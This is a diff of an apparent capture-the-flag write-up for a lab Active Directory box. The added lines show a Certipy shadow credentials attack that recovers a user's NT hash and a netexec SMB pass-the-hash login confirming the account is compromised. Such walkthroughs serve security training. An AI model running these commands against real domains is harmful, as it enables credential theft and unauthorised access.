@@ -542,6 +542,8 @@ So i cannot abuse `ForceChangePassword` for some reason here
 
 So ill have to abuse shadow credentials here
 
+https://www.hackingarticles.in/shadow-credentials-attack/
+
 ```python
 faketime -f +8h certipy-ad shadow auto -u 'haze-it-backup$@haze.htb' -hashes ':76da32697ff38bc7c9fa6289abf47940' -account 'edward.martin' -debug -dc-host dc01.haze.htb -dc-ip 10.129.12.135 -target dc01.haze.htb
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -586,4 +588,11 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
 ```
 I now have the NT hash for the user `edward.martin`
+
+```python
+nxc smb dc01.haze.htb -u edward.martin -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af'                                                                    
+SMB         10.129.12.135   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.12.135   445    DC01             [+] haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+This user is now compromised
 
